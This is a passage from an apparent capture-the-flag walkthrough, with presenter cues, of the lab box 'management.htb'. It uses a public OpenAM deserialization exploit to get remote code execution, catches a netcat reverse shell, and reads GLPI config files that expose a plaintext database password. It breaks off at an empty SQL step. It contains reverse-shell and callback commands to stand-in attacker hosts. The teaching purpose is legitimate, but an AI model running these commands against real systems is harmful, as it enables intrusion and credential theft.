for ep in /openam/ui/Login /openam/ui/PWResetUserValidation /openam/ui/PWResetQuestion; do
  echo -n "$ep -> "
  curl -sk -o /dev/null -w '%{http_code}\n' "https://sso.management.htb$ep"
done
```


> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> This little loop visits each of the three target pages in turn and prints only the response code, the three-digit status a web server returns. We discard the page content and keep just that number, because all we need to know is whether each page answers.

**Breakdown:**

- The loop walks the three candidate JATO endpoints.
- `curl -sk` fetches each over TLS, ignoring the self-signed cert; `-o /dev/null` discards the body; `-w '%{http_code}\n'` prints only the HTTP status.

**Result:**

```
/openam/ui/Login -> 200
/openam/ui/PWResetUserValidation -> 200
/openam/ui/PWResetQuestion -> 200
```


> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** [Point.] Three two-hundreds. Two-hundred means OK, the page responded normally, and it did so without asking us to log in. So the vulnerable doors are open and unguarded. We are clear to build the exploit.
>
> **TRANSITION and PHASE 2 RECAP:** Where are we now? We walked past a decoy site, pinned the exact OpenAM version, chose a pre-auth exploit from public research, and confirmed its target pages are live. Enumeration is done. Next we weaponize this and get our first shell.

**What this gives you:** All three legacy ViewBean endpoints answer with HTTP 200 and no authentication. **Key finding:** the deserialization sink is reachable pre-auth. These three paths are the delivery points for the `jato.clientSession` payload.

**Next:** Enter exploitation: understand the deserialization mechanism, then obtain and prepare a working proof-of-concept.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation & Initial Access

### 3.1 Prepare the attack environment: JDK 21

**Why this step:** The exploit compiles a malicious Java class locally that is then loaded and executed by the target’s JVM (Java Virtual Machine). Compiled bytecode carries a class-file version tied to the compiling JDK; a newer JDK produces bytecode the target’s older JVM rejects with `UnsupportedClassVersionError`, causing a silent failure. JDK 21 produces compatible bytecode for this target.


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> A setup step that quietly makes or breaks this entire exploit. Our exploit builds a small Java program on our machine that the target then runs. If we build it with the wrong version of Java, the target silently rejects it and we get nothing, with no error to tell us why. So first we install and lock in the exact Java version the target can accept.

**Commands:**

```shell
java -version          # initial check
sudo apt install -y openjdk-21-jdk
sudo update-alternatives --config java    # select the java-21 line
sudo update-alternatives --config javac   # select/confirm java-21
java -version 2>&1; javac -version 2>&1    # verify
```


> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> We check our current Java, install Java 21, and then tell the system to make 21 the default for both running and compiling Java. The last two lines confirm both now report twenty-one. The install pulls the full kit including the compiler, which our box happened to be missing.

**Breakdown:**

- The first `java -version` reveals the current JDK so you know whether a change is needed.
- `apt install openjdk-21-jdk` installs the full JDK 21 (compiler included, not just a runtime).
- `update-alternatives --config java` / `javac` switch the system default from any newer JDK to 21.
- The final version checks confirm both the runtime and compiler are 21.

**Result:**

```
# before
openjdk version "25.0.4"          # runtime only, javac not installed

# after selecting JDK 21
openjdk version "21.0.12.1" 2026-08-18
javac 21.0.12.1
```


> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** Both now say twenty-one. That is the detail that trips up most people attempting this box: they build with a newer Java, the target refuses it, and they stare at a silent failure for an hour.
>
> **CONCEPT BOX — why the Java version must match:** Plain version: compiled Java is stamped with the version that made it, and an older machine refuses to run anything stamped newer than itself, like a cassette player that cannot read a newer kind of tape. Depth line: each class file carries a bytecode version, and a too-new one triggers UnsupportedClassVersionError on the target, which here surfaces as simply no shell. Real world: version mismatches are a classic silent failure across every compiled language.
>
> **PRONOUNCE:** JDK = say J-D-K, the Java Development Kit. JVM = say J-V-M, the Java Virtual Machine.
>
> **TRANSITION:** Environment locked to Java 21. Now we fetch the public exploit and actually read it before we trust it.

**What this gives you:** A compiler and runtime pinned to JDK 21. **Key finding:** the attack box shipped with JDK 25 (and no compiler). Building the payload under 25 would have produced bytecode the target JVM refuses, so pinning to 21 is mandatory before any payload work.

**Next:** Obtain a public proof-of-concept for CVE-2026-33439 and review its structure before execution.
<div align="center">
<br>
<br>
</div>

#### Why do we need JDK 21 & how did we figure that we need it?

Short version: the exploit builds a small Java program on our machine, and the target's Java has to be able to run it. Build it with the wrong version of Java and the target quietly refuses it, with no error shown to us to explain why.

Why that happens: when you compile Java, the compiler writes out `.class` files containing **bytecode** (the actual instructions Java runs). Every `.class` file is stamped with a version number matching the Java that produced it, and a newer Java stamps a higher number. A Java runtime will happily run bytecode stamped with its own version or older, but it flatly refuses anything stamped **newer** than itself, throwing an error called `UnsupportedClassVersionError`.

In this attack our malicious class gets sent to the target and loaded by the target's Java. So our compiler has to be the same age or older than the target's Java, never newer. Compile with something too new and the target throws our payload away.

How we knew it had to be 21 specifically: two signals lined up. First, the public exploit's own documentation lists **JDK 21** as a requirement and notes it must match the OpenAM JVM. Second, our attack box shipped with JDK 25 (newer), which would have produced bytecode the target's older Java rejects. So we installed JDK 21 and made it the system default before building anything. This one detail is the single most common reason people report the exploit running cleanly yet never catching a shell.

<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 3.2 Acquire and inspect the CVE-2026-33439 PoC

**Why this step:** With JDK 21 in place, obtain a reference exploit and confirm it ships the correct OpenAM/Click/Xalan JARs needed to build a gadget chain matching the server’s classpath.


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> We never run a stranger's exploit blind. We download the public proof-of-concept, then look at how it is laid out and, importantly, what it brings with it.

**Command:**

```shell
git clone https://github.com/TheMalwareGuardian/CVE-2026-33439.git
cd CVE-2026-33439
ls -R
```

> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> git clone downloads the whole exploit project from GitHub. Then ls dash capital R lists everything inside it, folders and all, so we can see its structure in one go.


**Result (structure):**

```
01 Vulnerable/   docker-compose.yml          # local test lab
02 Exploit/      Exploit_CVE_2026_33439.py   # payload builder + sender
                 Jars/                        # classpath for the gadget chain
Jars/: click-extras-2.3.0.jar  click-nodeps-2.3.0.jar  jato-shaded-16.0.5.jar
       openam-core-16.0.5.jar  serializer-2.7.3.jar  servlet-api.jar  xalan-2.7.3.jar
```


> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** [Point.] Two useful things. There is one main exploit script, and there is a folder of Java library files it ships alongside it. Those libraries are the real pieces of OpenAM, so the exploit can be built against the exact same code the server runs. That means we do not have to go hunting for them ourselves, they are bundled.
>
> **CONCEPT BOX — what a proof-of-concept is:** Plain version: a proof-of-concept, or PoC, is sample code a researcher publishes to prove a flaw is real and show how to trigger it. Depth line: for a fresh flaw like this, the working exploit usually lives on GitHub well before it is packaged into mainstream tools, so knowing where to look matters. Real world: the gap between an advisory going public and a PoC appearing is often hours, which is why patching speed is everything.
>
> **PRONOUNCE:** PoC = say P-O-C or proof of concept. git clone = say git clone. JAR = say jar, a bundle of Java code.
>
> **TRANSITION:** We have the exploit and its parts. Let us look at exactly how it works and how we drive it before firing.

**What this gives you:** A working PoC bundled with the exact JAR versions matching OpenAM 16.0.5. **Key finding:** the `Jars/` directory supplies the real server-side classes (OpenAM core, the shaded JATO library, and OpenAM’s bundled Apache Click fork), so the gadget chain is built against classes guaranteed to exist on the target. No JAR download is required.

**Next:** Understand the deserialization gadget chain, then review the script’s invocation before firing.
<div align="center">
<br>
<br>
</div>

#### PoC Breakdown

The exploit does three jobs, in order: build a malicious Java class, wrap it in a gadget chain, and send that chain to the target as the `jato.clientSession` parameter. Here is each piece without the jargon.

**The malicious class (`EvilTranslet`).** This is a tiny Java class whose only purpose is to run our command. Java lets a class carry a block of code that runs the instant the class is loaded into memory (called a static initializer). We put `Runtime.getRuntime().exec(<our command>)` in that block. So the moment the target loads this class, our command runs.

**The gadget chain (how we force the target to load that class).** We can't simply tell the server "load my evil class," we have to trick it into doing so using ordinary classes that already ship inside OpenAM:

- We send a `PriorityQueue`, which is a self-sorting list. When Java rebuilds a sorted list from bytes it has to re-sort it, and to sort it has to compare its items.
- We rig that comparison to use a comparator borrowed from OpenAM's own bundled UI library, set to read a property called `outputProperties` off each item.
- The items in the list are a special object (`TemplatesImpl`) that holds raw compiled bytecode. Asking it for `outputProperties` makes it load and run that bytecode.
- That bytecode is our `EvilTranslet`. It runs, and our command executes.

So the single act of rebuilding the list from our bytes cascades, step by step, into running our command. Everything in the middle is just plumbing to force that final load.

**Why the `Jars/` folder matters.** A gadget chain only works if the exact classes it references actually exist on the target, with matching versions. The PoC ships the real OpenAM libraries (OpenAM core, its bundled Apache Click UI library, and the Xalan library that provides `TemplatesImpl`) so the chain is built against the very same classes the server runs. Mismatched versions and the server would reject the payload, which is why the repo bundles those specific `.jar` files instead of making you guess.

<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 3.3 Confirm the exploit interface and deserialization sink

**Why this step:** Before execution, confirm how the PoC is driven and verify its described sink matches the advisory, so the run is deliberate rather than copy-paste.


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> Two minutes of reading that saves an hour of guessing. We ask the exploit to print its own help, which shows us how to run it and, conveniently, documents exactly what flaw it abuses. We confirm that description matches the advisory we chose.

**Command:**

```shell
python3 '02 Exploit/Exploit_CVE_2026_33439.py' -h
```

> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> Running the script with dash h prints its usage and options instead of firing anything. It lists the inputs we will give it: the target address, the command we want to run, and where its library files are. It also prints the gadget chain, which is the step-by-step trick the exploit uses, and we will unpack that below.


**Result:**

```

  ██████╗ ██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗      ██████╗ ██████╗ ██╗  ██╗█████╗  ██████╗
  ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██╔═══╝      ╚════██╗╚════██╗██║  ██║╚════██╗██╔══██
  ██║     ██║   ██║█████╗       █████╔╝██║██╔██║ █████╔╝███████╗      █████╔╝ █████╔╝███████║█████╔╝╚██████║
  ██║     ╚██╗ ██╔╝██╔══╝      ██╔═══╝ ████╔╝██║██╔═══╝ ██═══██║      ╚═══██╗ ╚═══██╗ ╚═══██║╚═══██╗╚════██║
  ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝     █████╔╝ █████╔╝      ██║█████╔╝ █████╔╝
  ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝       ╚════╝  ╚════╝       ╚═╝╚════╝  ╚════╝

  CVE-2026-33439 | OpenAM Pre-Auth RCE via jato.clientSession Deserialization | CVSS 9.3 CRITICAL | CWE-502
  Author: TheMalwareGuardian - github.com/TheMalwareGuardian

usage: Exploit_CVE_2026_33439.py [-h] --url URL [--command COMMAND] [--jars JARS] [--endpoint ENDPOINT] [--method {GET,POST}] [--proxy PROXY]

CVE-2026-33439 - OpenAM Pre-Auth RCE via jato.clientSession

options:
  -h, --help           show this help message and exit
  --url URL            OpenAM base URL (e.g. http://openam.lab.local:8080/openam)
  --command COMMAND    OS command to execute on the target (default: touch /tmp/pwned)
  --jars JARS          Directory containing the required JARs (default: current directory)
  --endpoint ENDPOINT  Specific JATO endpoint (default: auto-probe all candidates)
  --method {GET,POST}  HTTP delivery method (default: GET)
  --proxy PROXY        HTTP proxy (e.g. http://127.0.0.1:8080)

CVE-2026-33439 - OpenAM Pre-Auth RCE via jato.clientSession Deserialization

Author    : TheMalwareGuardian
GitHub    : https://github.com/TheMalwareGuardian
Reference : https://github.com/OpenIdentityPlatform/OpenAM/security/advisories/GHSA-2cqq-rpvq-g5qj

Description:
        OpenAM deserializes the jato.clientSession HTTP parameter via ClientSession.deserializeAttributes() → Encoder.deserialize() → ApplicationObjectInputStream.readObject() with NO class whitelist.
        The WhitelistObjectInputStream fix applied to jato.pageSession after CVE-2021-35464 was never extended to jato.clientSession.

Gadget Chain (uses only classes bundled in the OpenAM WAR):
        PriorityQueue.readObject()                                 [java.util - JDK]
        → heapify() → siftDown() → comparator.compare()
                → Column$ColumnComparator.compare(o1, o2)              [openam-core-16.0.5.jar]
                → Column.getTable().isSortedAscending()                [click-nodeps-2.3.0.jar]
                → Column.getProperty(o1)
                        → PropertyUtils.getObjectPropertyValue(            [openam-core-16.0.5.jar]
                                o1, "outputProperties")
                        → TemplatesImpl.getOutputProperties()              [xalan-2.7.3.jar]
                                → defineTransletClasses()
                                → TransletClassLoader.defineClass(_bytecodes)
                                        → EvilTranslet.<clinit>()                  [attacker bytecode]
                                        → Runtime.getRuntime().exec(cmd)

Requirements:
        JDK 21 (javac)            - must match OpenAM JVM version
        openam-core-16.0.5.jar    - Column, PropertyUtils
        xalan-2.7.3.jar           - TemplatesImpl, TransformerFactoryImpl
        serializer-2.7.3.jar      - SerializationHandler (EvilTranslet interface)
        click-nodeps-2.3.0.jar    - Table (required by Column$ColumnComparator)
        click-extras-2.3.0.jar    - transitive dependency of click-nodeps
        jato-shaded-16.0.5.jar    - Encoder (encoding verification only)
        servlet-api.jar           - Jakarta Servlet API (Table serialization)
        Python 3.8+, requests

Setup (copy JARs from OpenAM container - run from PowerShell on host):
        docker cp cve_2026_33439_openam:/usr/local/tomcat/webapps/openam/WEB-INF/lib/openam-core-16.0.5.jar .
        docker cp cve_2026_33439_openam:/usr/local/tomcat/webapps/openam/WEB-INF/lib/xalan-2.7.3.jar .
        docker cp cve_2026_33439_openam:/usr/local/tomcat/webapps/openam/WEB-INF/lib/serializer-2.7.3.jar .
        docker cp cve_2026_33439_openam:/usr/local/tomcat/webapps/openam/WEB-INF/lib/click-nodeps-2.3.0.jar .
        docker cp cve_2026_33439_openam:/usr/local/tomcat/webapps/openam/WEB-INF/lib/click-extras-2.3.0.jar .
        docker cp cve_2026_33439_openam:/usr/local/tomcat/webapps/openam/WEB-INF/lib/jato-shaded-16.0.5.jar .
        docker cp cve_2026_33439_openam:/usr/local/tomcat/lib/servlet-api.jar .

Usage:
        python3 Exploit_CVE_2026_33439.py --url http://openam.lab.local:8080/openam --command "touch /tmp/pwned"
        python3 Exploit_CVE_2026_33439.py --url http://openam.lab.local:8080/openam --command "bash -i >& /dev/tcp/attacker/4444 0>&1"
        python3 Exploit_CVE_2026_33439.py --url http://openam.lab.local:8080/openam --command "curl http://attacker:9999/pwned" --proxy http://127.0.0.1:8080
```

**Result (key facts):**

```
Sink:  ClientSession.deserializeAttributes() -> Encoder.deserialize()
       -> ApplicationObjectInputStream.readObject()   [NO class whitelist]
Cause: the CVE-2021-35464 WhitelistObjectInputStream fix on jato.pageSession
       was never extended to jato.clientSession
Args:  --url (OpenAM base, include /openam)  --command  --jars  --endpoint
       --method {GET,POST}  --proxy
```


> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** [Point.] The help confirms our flaw: OpenAM takes one web request value and rebuilds it into a live object without checking what it is allowed to build, and that is what lets us run code. It also tells us the script auto-targets all three vulnerable pages for us. Good, less for us to get wrong.
>
> **CONCEPT BOX — what deserialization code execution is:** Plain version: programs can freeze a chunk of data into a blob to store or send, then thaw it back into a live object later. The danger is that thawing can automatically run setup code, so if an attacker controls the blob, they can steer the program into running their commands. It is like a flat-pack kit where the instructions themselves are rigged to build a weapon. Depth line: Java's readObject invokes methods during reconstruction, and a gadget chain strings trusted classes together so those automatic calls end in command execution. Real world: unsafe deserialization has been one of the most damaging bug classes in enterprise Java for a decade.
>
> **PRONOUNCE:** deserialization = say dee-SERIAL-ization. gadget chain = say gadget chain.
>
> **TRANSITION:** We understand the weapon and how to aim it. Time to prove it runs, then catch a shell.

**What this gives you:** A confirmed invocation interface and a sink matching GHSA-2cqq-rpvq-g5qj. **Key finding:** the deserialization reads an attacker-controlled parameter with no allow-list, exactly the gap described in 3.2.1. The script auto-probes all three JATO endpoints by default.

**Next:** Prove blind code execution out-of-band before attempting a shell.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 3.4 Fire the payload and catch the shell

**Why this step:** With the environment prepared and the PoC understood, deliver a reverse-shell command through the `jato.clientSession` deserialization sink to obtain code execution as the OpenAM service user.


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> This is the moment. We are going to have the target connect back to us and hand us a command line on itself, called a reverse shell. First we open a listener on our machine that waits for that call back. Then we fire the exploit and tell it to make the target dial home to us.

**Commands:**

Terminal 1, listener:

```shell
nc -lvnp 4444
```

Terminal 2, exploit (replace with your own VPN IP and port):

```shell
python3 '02 Exploit/Exploit_CVE_2026_33439.py' \
  --url https://sso.management.htb/openam \
  --jars '02 Exploit/Jars' \
  --command 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```


> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> In the first window, nc dash l-v-n-p four-four-four-four just sits and listens on port four-four-four-four for an incoming connection. In the second window we run the exploit, pointing it at the OpenAM address, at its bundled libraries, and giving it one instruction for the target: open a shell and connect back to my address on that port. The exploit builds the booby-trapped blob, sends it to all three vulnerable pages, and the target runs our instruction.

**Breakdown:**

- `--url .../openam` targets the OpenAM application root (the `/openam` path is required).
- `--jars '02 Exploit/Jars'` points the payload builder at the bundled OpenAM/Click/Xalan classes so the gadget chain matches the server classpath.
- `--command 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'` is the reverse shell; the script wraps it in a shell so the `>&` redirection is honored.

**Result (IPs scrubbed):**

```
[*] Building gadget chain    | PriorityQueue → Column$ColumnComparator → TemplatesImpl → EvilTranslet
[+] Payload ready            | 4343 chars (URL-safe base64)
[*] Delivering payload       | method=GET | /ui/PWResetUserValidation  → HTTP 200
[*] Delivering payload       | method=GET | /ui/PWResetQuestion        → HTTP 200
[*] Delivering payload       | method=GET | /ui/Login                  → HTTP 200

# listener
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 54464
bash: cannot set terminal process group (1695): Inappropriate ioctl for device
openam@management:/$
```


> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** [Point at the listener window.] There it is, a connection from the target, and the prompt now says openam at management. We are executing commands on the machine as the openam service account. That is pre-authentication remote code execution: we never had a password. One honest note, the exploit side may look like it hung or errored. Ignore that. On this flaw the code runs regardless, so we trust the listener, not the script output.
>
> **CONCEPT BOX — what a reverse shell is:** Plain version: instead of us dialing into the target, which firewalls usually block, we make the target dial out to us, which firewalls usually allow, and that outbound call carries a command line we control. It is like getting a locked building to phone you and hand you the keys. Depth line: the payload wraps the connect-back in a real shell so the redirection works, and code execution is decoupled from the web response, which is why timeouts do not mean failure here. Real world: reverse shells are the default way attackers get interactive access after a web exploit.
>
> **PRONOUNCE:** nc = say netcat. reverse shell = say reverse shell.
>
> **TRANSITION:** We have a shell, but it is a raw, clumsy one. Let us upgrade it into something comfortable before we explore.

**What this gives you:** An interactive shell as the `openam` user. **Key finding:** pre-authentication remote code execution achieved with no credentials. Execution is decoupled from the HTTP response (the responses return 200 regardless), so success is confirmed on the listener, not in the script output.

**Next:** Stabilize the raw shell into a full TTY, then enumerate the local system.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 3.5 Stabilize the shell and establish context

**Why this step:** A raw Netcat shell lacks job control and a usable TTY. Upgrade it, then confirm the current user, host, and OS before enumerating.


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> Our first shell is fragile: no arrow keys, no tab completion, and pressing control-C would kill it entirely. A quick ritual upgrades it into a proper terminal. Then we take our bearings: who are we, what machine is this, what operating system.

**Commands:**

```shell
# in the reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
export SHELL=/bin/bash
# Ctrl+Z, then on the attack box:
stty raw -echo; fg
# press Enter twice
id; hostname; cat /etc/os-release | head -2
```

> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> The Python one-liner spawns a proper interactive shell inside our connection. The two export lines tell programs what kind of terminal we have so full-screen tools behave. Then we background it, run a small stty command on our side to fix the typing behavior, and bring it back. After that, id, hostname and the os-release file tell us our identity and the system.


**Result:**

```
uid=996(openam) gid=987(openam) groups=987(openam)
management
PRETTY_NAME="Ubuntu 24.04.5 LTS"
```


> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** [Point.] We are the user openam, a limited service account with no special group memberships, on Ubuntu twenty-four. That word limited matters: this account was built to run one service and little else, so to get anywhere we will need to become a real human user. That is our next goal.
>
> **PRONOUNCE:** TTY = say T-T-Y, short for teletype, meaning a proper terminal. stty = say S-T-T-Y.
>
> **TRANSITION and PHASE 3 RECAP:** Where are we now? We turned a public exploit into a real shell on the box as the openam service account, with no credentials at all, and made that shell comfortable. Foothold complete. Next we hunt for a way up to a real user. [Good spot for a 5 minute break.]

**What this gives you:** A stable TTY as a low-privileged service account. **Key finding:** you are `openam` (uid 996), a dedicated service user with no extra group memberships, on Ubuntu 24.04. This is an unprivileged foothold; privilege escalation will require pivoting to a real user.

**Next:** Enumerate local users and the `/opt` directory to find what else this server runs.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Lateral Movement

### 4.1 Enumerate users and installed applications

**Why this step:** The foothold is an unprivileged service account. Identify which human users exist and what other software runs locally to find a path to a real user.


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> Now the detective work. Two questions every attacker asks on a new box: who else lives here, and what software did someone install by hand. The answers point us at our next step up.

**Commands:**

```shell
ls -la /home
ls -la /opt
```

> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> ls dash l-a on slash home lists the human users' folders. ls dash l-a on slash opt lists hand-installed software, since slash opt is the traditional home for applications an admin added outside the normal package system.


**Result:**

```
# /home
drwxr-x---  3 owen owen 4096  owen        # user flag holder; unreadable as openam

# /opt
drwxr-xr-x  4 www-data www-data  backup           # backup (www-data)
drwxr-xr-x  3 root     root      backups          # backup (root-owned) -> relevant to privesc
drwxr-xr-x 22 www-data www-data  glpi             # service desk (GLPI) -> pivot candidate
drwxr-x---  3 openam   openam    openam           # identity (our access)
drwxr-xr-x  9 openam   openam    openam-tomcat    # identity (our access)
drwxr-xr-x  5 root     root      sysinternalsEBPF # monitoring decoy
drwx------  2 root     root      sysmon           # monitoring decoy (root only)
```


> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** [Point.] Two findings. There is one human user, owen, and we cannot read his folder yet, so becoming owen is clearly the goal. And in slash opt we see a second web app called GLPI owned by the web user, plus our own OpenAM, some backup folders, and a couple of scary-named monitoring folders that are just decoys. Remember the tagline, identity, service desk, monitoring, backup? Every one is sitting right here.
>
> **CONCEPT BOX — what /opt tells an attacker:** Plain version: slash opt is where admins drop big self-contained programs they installed by hand, so it is basically a list of the extra software someone deliberately added. Depth line: ownership matters as much as contents, the web-user-owned folders hint at what the web stack serves, and the root-owned backup folder foreshadows our privilege escalation. Real world: slash opt, home directories, and running processes are the first three things responders check on a suspect host.
>
> **TRANSITION:** GLPI, that second web app, is our most promising lead, because apps like it tend to store passwords in files on disk. Let us go look.

**What this gives you:** A map of the host. **Key finding:** a second web application, **GLPI**, runs out of `/opt/glpi` as `www-data`, and the only human user is `owen` (whose home is unreadable to us). GLPI is the most promising pivot because such apps store database and LDAP credentials in on-disk config files. The `sysinternalsEBPF`/`sysmon` directories are decoys; the root-owned `/opt/backups` is noted for the privilege-escalation phase.

**Next:** Inspect GLPI’s configuration directory for world-readable credential material.
<div align="center">
<br>
<br>
</div>

#### What does the `/opt` usually have and a breakdown of what ours contains

**What `/opt` is for.** On Linux, `/opt` (short for "optional") is the conventional home for self-contained, third-party software that did not come from the system's normal package manager. When an admin installs a big application by hand, a vendor bundle, a web app, or anything that likes to keep all its files together in one folder, it usually lands in `/opt`. So the folder is effectively an inventory of the extra software someone deliberately added to this box, which makes it one of the first places worth checking after you land a shell.

**What ours contains, folder by folder:**

- `glpi` (owned by `www-data`) - a second web application, the GLPI help-desk and asset-management suite. Owned by the web user, so it is served by the web stack. This is our pivot.
- `openam` and `openam-tomcat` (owned by `openam`) - the OpenAM identity platform we exploited, and the Tomcat server it runs on. Readable by us because we are the `openam` user.
- `backup` (owned by `www-data`) and `backups` (owned by `root`) - backup-related folders. The root-owned one ties into the backup job we abuse later for privilege escalation.
- `sysinternalsEBPF` and `sysmon` (owned by `root`) - monitoring tools with deliberately intimidating names. `sysmon` is locked to root (`drwx------`), and neither leads anywhere. These are decoys meant to burn your time.

Read against the main site's marketing copy ("identity, service desk, monitoring and backup"), every one of those four themes shows up here: identity (openam), service desk (glpi), monitoring (the sysmon / EBPF decoys), and backup (backup / backups).

<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 4.2 Discover world-readable GLPI secrets

**Why this step:** GLPI stores database and integration credentials under `config/`. Enumerate the directory’s permissions to find which sensitive files are readable by the unprivileged `openam` account.


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> GLPI is a help-desk application, and apps like it keep their settings, including passwords, in plain config files. We are going to look at that config folder, and the key thing we care about is not just what files exist but who is allowed to read them.

**Command:**

```shell
ls -la /opt/glpi/config/
```

> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> ls dash l-a on the GLPI config folder lists its files with their permissions. The part to watch is the permission bits on the left of each line, which say who can read each file.


**Result:**

```
-rw-r--r--  1 www-data www-data  273  config_db.php     # world-readable
-rw-r--r--  1 www-data www-data   32  glpicrypt.key     # world-readable (32 bytes)
-rw-rw----  1 www-data www-data 1704  oauth.pem         # www-data only
-rw-rw----  1 www-data www-data  451  oauth.pub         # www-data only
```


> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** [Point at the permissions.] Two of these files are readable by everyone on the system, including our limited account: the database config and a thirty-two-byte encryption key. That second one is the jackpot. An app that encrypts its secrets but leaves the decryption key readable by everyone has basically locked the safe and taped the key to the door.
>
> **CONCEPT BOX — reading Linux permissions:** Plain version: every Linux file says who can read, write, and run it, split into three groups: the owner, the owner's team, and everyone else. When that last everyone-else group has read, any account on the box can open it. Depth line: the rightmost r in the mode is world-read, which is why our openam account can read files owned by the web user. Real world: overly generous file permissions are one of the most common and most exploited misconfigurations in the wild.
>
> **PRONOUNCE:** GLPI = say G-L-P-I. permissions: say read-write-execute.
>
> **TRANSITION:** We can read the database config. Let us open it and grab those credentials.

**What this gives you:** Two readable secrets despite not being the owning user. **Key finding:** `config_db.php` (database credentials) and `glpicrypt.key` (a 32-byte symmetric key) are world-readable. A decryption key stored world-readable next to the application’s encrypted data is a critical misconfiguration, since it makes any “encrypted” GLPI secret trivially recoverable.

**Next:** Read the database configuration to obtain GLPI’s MySQL credentials.
<div align="center">
<br>
<br>
</div>

#### What is glpi and what is it's role here?

**GLPI** (a French acronym, "Gestionnaire Libre de Parc Informatique," roughly "free IT asset manager") is a popular open-source help-desk and IT asset-management application. Organizations use it to track support tickets, inventory their hardware and software, manage licenses, and so on. It is a PHP web app that stores its data in a MySQL/MariaDB database.

**Its role on this box, and why we care:** GLPI is the "service desk" from the main site's marketing copy, and it is the bridge from our service-account foothold to a real user. Two things make it the pivot:

- Like most PHP apps, it keeps its settings in plain-text config files on disk, including the database password. One of those files was readable by everyone, which handed us the database.
- GLPI can tie into a company directory (LDAP) so staff log in with their directory accounts. To do that it stores a directory "bind" password, and it encrypts that password with a key it also keeps on disk. Because we could read both the encrypted password and the key, we could reverse it.

In other words, GLPI itself is not the final target, it is the filing cabinet where the credentials that get us to `owen` are stored. The box author uses it as a realistic example of how one weakly-protected application becomes the stepping stone to the rest of a network.

<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 4.3 Extract GLPI database credentials

**Why this step:** With `config_db.php` world-readable, read it to obtain GLPI’s database credentials for direct access to its MySQL store.


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> Straight ahead now. We open the database config file and read the login details GLPI uses to reach its own database.

**Command:**

```shell
cat /opt/glpi/config/config_db.php
```

> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> cat just prints the file. We are looking for four things: the database host, the username, the password, and the database name.


**Result:**

```php
public $dbhost     = '127.0.0.1';
public $dbuser     = 'glpi';
public $dbpassword = '8rhu0L6Pw4Y7';
public $dbdefault  = 'glpidb';
```


> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** [Point, but do not read the password aloud.] There they are, in plain text: a username, a password, and the database name, all readable on disk. This is one of the most common real-world mistakes there is, because almost every app of this type stores its database password this way by default. Those credentials get us into the database, where the real treasure is.
>
> **PRONOUNCE:** MySQL = say My-S-Q-L or My-sequel. MariaDB = say Maria-D-B.
>
> **TRANSITION:** Credentials in hand. Let us log into that database and go looking for anything that gets us to owen.

**What this gives you:** Plaintext MySQL credentials. **Key finding:** GLPI authenticates to MySQL as `glpi` / `8rhu0L6Pw4Y7` against the `glpidb` database on localhost. These credentials grant direct read access to all GLPI data, including user records and LDAP integration settings.

**Next:** Connect to the database and locate authentication-related tables.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 4.4 Recover the LDAP bind credential from the database

**Why this step:** With database access, locate stored credentials. GLPI’s LDAP integration stores a bind password that, unlike the user password hashes, is reversibly encrypted.


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> Inside the database we go straight for authentication data. We will look at two things: the app's user table, which turns out to be a trap, and the directory integration settings, which hold the real prize, a stored login password.

**Commands:**

```sql
